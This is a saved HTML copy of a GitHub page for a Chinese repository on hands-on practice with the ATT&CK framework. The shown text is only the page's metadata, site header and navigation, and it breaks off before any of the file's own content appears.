<!DOCTYPE html>
<!-- saved from url=(0109)https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
  <link rel="dns-prefetch" href="https://github.githubassets.com/">
  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com/">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <link crossorigin="anonymous" media="all" integrity="sha512-aVn2DoCuXdXX9G3sp/Luupl/Ui00/iXrUh7Ke3geLlkigQY8GHBky7kKRSuyeKxGApWDdCQUy+6gTF1ZmYHWkw==" rel="stylesheet" href="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/frameworks-6b8b7859c4b8fbe3ab45f8ab0905a9f8.css">
  
    <link crossorigin="anonymous" media="all" integrity="sha512-ydfDuKYBLPHSpCVPzvwLRfR0gg5i7IZMHos/5JeYH4mnbPJ8iRGVrALidsmLBqRMhuyJpCo5i7v90WqxJV+FGQ==" rel="stylesheet" href="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/github-291843805c7223f6580992fec16768ed.css">
    
    
    
    

  <meta name="viewport" content="width=device-width">
  
  <title>ATT-CK-CN/ATT&amp;CK模型.md at master · lengjibo/ATT-CK-CN</title>
    <meta name="description" content="ATT&amp;CK实操. Contribute to lengjibo/ATT-CK-CN development by creating an account on GitHub.">
    <link rel="search" type="application/opensearchdescription+xml" href="https://github.com/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">

    <meta name="twitter:image:src" content="https://avatars1.githubusercontent.com/u/31297202?s=400&amp;v=4"><meta name="twitter:site" content="@github"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="lengjibo/ATT-CK-CN"><meta name="twitter:description" content="ATT&amp;CK实操. Contribute to lengjibo/ATT-CK-CN development by creating an account on GitHub.">
    <meta property="og:image" content="https://avatars1.githubusercontent.com/u/31297202?s=400&amp;v=4"><meta property="og:site_name" content="GitHub"><meta property="og:type" content="object"><meta property="og:title" content="lengjibo/ATT-CK-CN"><meta property="og:url" content="https://github.com/lengjibo/ATT-CK-CN"><meta property="og:description" content="ATT&amp;CK实操. Contribute to lengjibo/ATT-CK-CN development by creating an account on GitHub.">

  <link rel="assets" href="https://github.githubassets.com/">
  <link rel="web-socket" href="wss://live.github.com/_sockets/VjI6NDM3NDMxMzUwOjE0MDYwOWI2OTEzY2IwZTI5MTg5NDUyMzE0MGVkNTU2NGQ4OTUzOWI0NGMzY2U2OThkNTYwNzY3OWFlMjk2NDM=--93780e4068930b0a1d40b47c8880429c0a7a7fcc">
  <meta name="pjax-timeout" content="1000">
  <link rel="sudo-modal" href="https://github.com/sessions/sudo_modal">
  <meta name="request-id" content="9AC0:0628:8141B5:B84344:5D7617E4" data-pjax-transient="">


  

  <meta name="selected-link" value="repo_source" data-pjax-transient="">

      <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
    <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
    <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

  <meta name="octolytics-host" content="collector.githubapp.com"><meta name="octolytics-app-id" content="github"><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event"><meta name="octolytics-dimension-request_id" content="9AC0:0628:8141B5:B84344:5D7617E4"><meta name="octolytics-dimension-region_edge" content="ap-southeast-1"><meta name="octolytics-dimension-region_render" content="iad"><meta name="octolytics-dimension-ga_id" content="731504056.1566446195" class="js-octo-ga-id"><meta name="octolytics-dimension-visitor_id" content="7774702620569899631"><meta name="octolytics-actor-id" content="52145536"><meta name="octolytics-actor-login" content="xidaner"><meta name="octolytics-actor-hash" content="fa7c80eb8b3516a56ab591535bdc0c671c8834cd6d7e2dc58dc46d9746639180">
<meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-pjax-transient="true">



    <meta name="google-analytics" content="UA-3769691-2">

  <meta class="js-ga-set" name="userId" content="9c24159a4ebf568360dd736e1d0284a4">

<meta class="js-ga-set" name="dimension1" content="Logged In">



  

      <meta name="hostname" content="github.com">
    <meta name="user-login" content="xidaner">

      <meta name="expected-hostname" content="github.com">
    <meta name="js-proxy-site-detection-payload" content="MzIyYTg5MTY0Njc2OWU2MTI4N2E1NjNhNzQ3YjlmODAwZWQzYjU3Zjk4ZmRiZGYwYzhiM2MyMWY4ZDcxZGFhZHx7InJlbW90ZV9hZGRyZXNzIjoiMTE0LjIzMi4yMy4xNjciLCJyZXF1ZXN0X2lkIjoiOUFDMDowNjI4OjgxNDFCNTpCODQzNDQ6NUQ3NjE3RTQiLCJ0aW1lc3RhbXAiOjE1NjgwMjA0NTMsImhvc3QiOiJnaXRodWIuY29tIn0=">

    <meta name="enabled-features" content="ACTIONS_V2_ON_MARKETPLACE,MARKETPLACE_FEATURED_BLOG_POSTS,MARKETPLACE_INVOICED_BILLING,MARKETPLACE_SOCIAL_PROOF_CUSTOMERS,MARKETPLACE_TRENDING_SOCIAL_PROOF,MARKETPLACE_RECOMMENDATIONS,MARKETPLACE_PENDING_INSTALLATIONS,NOTIFY_ON_BLOCK,RELATED_ISSUES,GHE_CLOUD_TRIAL">

  <meta name="html-safe-nonce" content="952685da6b4cc47f58a0b0ec4bf9863e23aeaa7a">

  <meta http-equiv="x-pjax-version" content="cd7a3cbd24effb2f933ee1fb847867b1">
  

      <link href="https://github.com/lengjibo/ATT-CK-CN/commits/master.atom" rel="alternate" title="Recent Commits to ATT-CK-CN:master" type="application/atom+xml">

  <meta name="go-import" content="github.com/lengjibo/ATT-CK-CN git https://github.com/lengjibo/ATT-CK-CN.git">

  <meta name="octolytics-dimension-user_id" content="31297202"><meta name="octolytics-dimension-user_login" content="lengjibo"><meta name="octolytics-dimension-repository_id" content="206977267"><meta name="octolytics-dimension-repository_nwo" content="lengjibo/ATT-CK-CN"><meta name="octolytics-dimension-repository_public" content="true"><meta name="octolytics-dimension-repository_is_fork" content="false"><meta name="octolytics-dimension-repository_network_root_id" content="206977267"><meta name="octolytics-dimension-repository_network_root_nwo" content="lengjibo/ATT-CK-CN"><meta name="octolytics-dimension-repository_explore_github_marketplace_ci_cta_shown" content="false">


    <link rel="canonical" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md" data-pjax-transient="">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="icon" type="image/x-icon" class="js-site-favicon" href="https://github.githubassets.com/favicon.ico">

<meta name="theme-color" content="#1e2327">



  <meta name="webauthn-auth-enabled" content="true">

  <meta name="webauthn-registration-enabled" content="true">

  <link rel="manifest" href="https://github.com/manifest.json" crossorigin="use-credentials">

  </head>

  <body class="logged-in env-production page-responsive page-blob">
    

  <div class="position-relative js-header-wrapper ">
    <a href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#start-of-content" tabindex="1" class="p-3 bg-blue text-white show-on-focus js-skip-to-content">Skip to content</a>
    <div id="js-pjax-loader-bar" class="pjax-loader-bar"><div class="progress"></div></div>

    
    
    


          <header class="Header js-details-container Details flex-wrap flex-lg-nowrap p-responsive" role="banner">

    <div class="Header-item d-none d-lg-flex">
      <a class="Header-link" href="https://github.com/" data-hotkey="g d" aria-label="Homepage" data-ga-click="Header, go to dashboard, icon:logo">
  <svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" version="1.1" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"></path></svg>
</a>

    </div>

    <div class="Header-item d-lg-none">
      <button class="Header-link btn-link js-details-target" type="button" aria-label="Toggle navigation" aria-expanded="false">
        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 12 16" version="1.1" width="18" aria-hidden="true"><path fill-rule="evenodd" d="M11.41 9H.59C0 9 0 8.59 0 8c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zm0-4H.59C0 5 0 4.59 0 4c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zM.59 11H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1H.59C0 13 0 12.59 0 12c0-.59 0-1 .59-1z"></path></svg>
      </button>
    </div>

    <div class="Header-item Header-item--full flex-column flex-lg-row width-full flex-order-2 flex-lg-order-none mr-0 mr-lg-3 mt-3 mt-lg-0 Details-content--hidden">
        <div class="header-search flex-self-stretch flex-lg-self-auto mr-0 mr-lg-3 mb-3 mb-lg-0 scoped-search site-scoped-search js-site-search position-relative js-jump-to" role="combobox" aria-owns="jump-to-results" aria-label="Search or jump to" aria-haspopup="listbox" aria-expanded="false">
  <div class="position-relative">
    <!-- '"` --><!-- </textarea></xmp> --><form class="js-site-search-form" role="search" aria-label="Site" data-scope-type="Repository" data-scope-id="206977267" data-scoped-search-url="/lengjibo/ATT-CK-CN/search" data-unscoped-search-url="/search" action="https://github.com/lengjibo/ATT-CK-CN/search" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="✓">
      <label class="form-control input-sm header-search-wrapper p-0 header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center js-chromeless-input-container">
        <input type="text" class="form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable" data-hotkey="s,/" name="q" value="" placeholder="Search or jump to…" data-unscoped-placeholder="Search or jump to…" data-scoped-placeholder="Search or jump to…" autocapitalize="off" aria-autocomplete="list" aria-controls="jump-to-results" aria-label="Search or jump to…" data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations#csrf-token=slclL79L2vJlWrX6ACu9QxSMHaCtpGTxLp1Y+px4UxU5vkLjvnTaVH2vIEhBMh8dccONunvnb0kUWRcjGptvHQ==" spellcheck="false" autocomplete="off">
          <input type="hidden" class="js-site-search-type-field" name="type">
            <img src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/search-key-slash.svg" alt="" class="mr-2 header-search-key-slash">

            <div class="Box position-absolute overflow-hidden d-none jump-to-suggestions js-jump-to-suggestions-container">
              
<ul class="d-none js-jump-to-suggestions-template-container">
  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-suggestion" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 12 16" version="1.1" role="img"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 15 16" version="1.1" role="img"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>

</ul>

<ul class="d-none js-jump-to-no-results-template-container">
  <li class="d-flex flex-justify-center flex-items-center f5 d-none js-jump-to-suggestion p-2">
    <span class="text-gray">No suggested jump to results</span>
  </li>
</ul>

<ul id="jump-to-results" role="listbox" class="p-0 m-0 js-navigation-container jump-to-suggestions-results-container js-jump-to-suggestions-results-container">
  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-scoped-search d-none" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 12 16" version="1.1" role="img"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 15 16" version="1.1" role="img"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>

  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-global-search d-none" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 12 16" version="1.1" role="img"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 15 16" version="1.1" role="img"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>


    <li class="d-flex flex-justify-center flex-items-center p-0 f5 js-jump-to-suggestion">
      <img src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/octocat-spinner-128.gif" alt="Octocat Spinner Icon" class="m-2" width="28">
    </li>
</ul>

            </div>
      </label>
</form>  </div>
</div>


      <nav class="d-flex flex-column flex-lg-row flex-self-stretch flex-lg-self-auto" aria-label="Global">
    <a class="Header-link d-block d-lg-none py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-ga-click="Header, click, Nav menu - item:dashboard:user" aria-label="Dashboard" href="https://github.com/dashboard">
      Dashboard
</a>
  <a class="js-selected-navigation-item Header-link  mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-hotkey="g p" data-ga-click="Header, click, Nav menu - item:pulls context:user" aria-label="Pull requests you created" data-selected-links="/pulls /pulls/assigned /pulls/mentioned /pulls" href="https://github.com/pulls">
    Pull requests
</a>
  <a class="js-selected-navigation-item Header-link  mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-hotkey="g i" data-ga-click="Header, click, Nav menu - item:issues context:user" aria-label="Issues you created" data-selected-links="/issues /issues/assigned /issues/mentioned /issues" href="https://github.com/issues">
    Issues
</a>
    <div class="mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15">
      <a class="js-selected-navigation-item Header-link" data-ga-click="Header, click, Nav menu - item:marketplace context:user" data-octo-click="marketplace_click" data-octo-dimensions="location:nav_bar" data-selected-links=" /marketplace" href="https://github.com/marketplace">
        Marketplace
</a>      

    </div>

  <a class="js-selected-navigation-item Header-link  mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-ga-click="Header, click, Nav menu - item:explore" data-selected-links="/explore /trending /trending/developers /integrations /integrations/feature/code /integrations/feature/collaborate /integrations/feature/ship showcases showcases_search showcases_landing /explore" href="https://github.com/explore">
    Explore
</a>


    <a class="Header-link d-block d-lg-none mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" href="https://github.com/xidaner">
      <img class="avatar" height="20" width="20" alt="@xidaner" src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/52145536">
      xidaner
</a>
    <!-- '"` --><!-- </textarea></xmp> --><form action="https://github.com/logout" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="u3jJHhdlOXzMw3iZJP3oL/HEbkeeRFjcQAMmBBrYQWt3XX5vSB8XKIPqit2iKYH1YG0n6T1YUfg3MO95OkBgcg==">
      <button type="submit" class="Header-link mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15 d-lg-none btn-link d-block width-full text-left" data-ga-click="Header, sign out, icon:logout" style="padding-left: 2px;">
        <svg class="octicon octicon-sign-out v-align-middle" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 9V7H8V5h4V3l4 3-4 3zm-2 3H6V3L2 1h8v3h1V1c0-.55-.45-1-1-1H1C.45 0 0 .45 0 1v11.38c0 .39.22.73.55.91L6 16.01V13h4c.55 0 1-.45 1-1V8h-1v4z"></path></svg>
        Sign out
      </button>
</form></nav>

    </div>

    <div class="Header-item Header-item--full flex-justify-center d-lg-none position-relative">
      <div class="css-truncate css-truncate-target width-fit position-absolute left-0 right-0 text-center">
              <svg class="octicon octicon-repo" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
    <a class="Header-link" href="https://github.com/lengjibo">lengjibo</a>
    /
    <a class="Header-link" href="https://github.com/lengjibo/ATT-CK-CN">ATT-CK-CN</a>

</div>
    </div>



    <div class="Header-item mr-0 mr-lg-3 flex-order-1 flex-lg-order-none">
      

    <a aria-label="You have no unread notifications" class="Header-link notification-indicator position-relative tooltipped tooltipped-s js-socket-channel js-notification-indicator" data-hotkey="g n" data-ga-click="Header, go to notifications, icon:read" data-channel="notification-changed:52145536" href="https://github.com/notifications">
        <span class="mail-status "></span>
        <svg class="octicon octicon-bell" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14 12v1H0v-1l.73-.58c.77-.77.81-2.55 1.19-4.42C2.69 3.23 6 2 6 2c0-.55.45-1 1-1s1 .45 1 1c0 0 3.39 1.23 4.16 5 .38 1.88.42 3.66 1.19 4.42l.66.58H14zm-7 4c1.11 0 2-.89 2-2H5c0 1.11.89 2 2 2z"></path></svg>
</a>
    </div>


    <div class="Header-item position-relative d-none d-lg-flex">
      <details class="details-overlay details-reset">
  <summary class="Header-link" aria-label="Create new…" data-ga-click="Header, create new, icon:add" aria-haspopup="menu">
    <svg class="octicon octicon-plus" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 9H7v5H5V9H0V7h5V2h2v5h5v2z"></path></svg> <span class="dropdown-caret"></span>
  </summary>
  <details-menu class="dropdown-menu dropdown-menu-sw" role="menu">
    
<a role="menuitem" class="dropdown-item" href="https://github.com/new" data-ga-click="Header, create new repository">
  New repository
</a>

  <a role="menuitem" class="dropdown-item" href="https://github.com/new/import" data-ga-click="Header, import a repository">
    Import repository
  </a>

<a role="menuitem" class="dropdown-item" href="https://gist.github.com/" data-ga-click="Header, create new gist">
  New gist
</a>

  <a role="menuitem" class="dropdown-item" href="https://github.com/organizations/new" data-ga-click="Header, create new organization">
    New organization
  </a>


  <div role="none" class="dropdown-divider"></div>
  <div class="dropdown-header">
    <span title="lengjibo/ATT-CK-CN">This repository</span>
  </div>
    <a role="menuitem" class="dropdown-item" href="https://github.com/lengjibo/ATT-CK-CN/issues/new" data-ga-click="Header, create new issue" data-skip-pjax="">
      New issue
    </a>


  </details-menu>
</details>

    </div>

    <div class="Header-item position-relative mr-0 d-none d-lg-flex">
      
<details class="details-overlay details-reset">
  <summary class="Header-link" aria-label="View profile and more" data-ga-click="Header, show menu, icon:avatar" aria-haspopup="menu">
    <img alt="@xidaner" class="avatar" src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/52145536(1)" height="20" width="20">
    <span class="dropdown-caret"></span>
  </summary>
  <details-menu class="dropdown-menu dropdown-menu-sw mt-2" style="width: 180px" role="menu">
    <div class="header-nav-current-user css-truncate"><a role="menuitem" class="no-underline user-profile-link px-3 pt-2 pb-2 mb-n2 mt-n1 d-block" href="https://github.com/xidaner" data-ga-click="Header, go to profile, text:Signed in as">Signed in as <strong class="css-truncate-target">xidaner</strong></a></div>
    <div role="none" class="dropdown-divider"></div>

      <div class="pl-3 pr-3 f6 user-status-container js-user-status-context pb-1" data-url="/users/status?compact=1&amp;link_mentions=0&amp;truncate=1">
        
<div class="js-user-status-container
    user-status-compact rounded-1 px-2 py-1 mt-2
    border
  " data-team-hovercards-enabled="">
  <details class="js-user-status-details details-reset details-overlay details-overlay-dark">
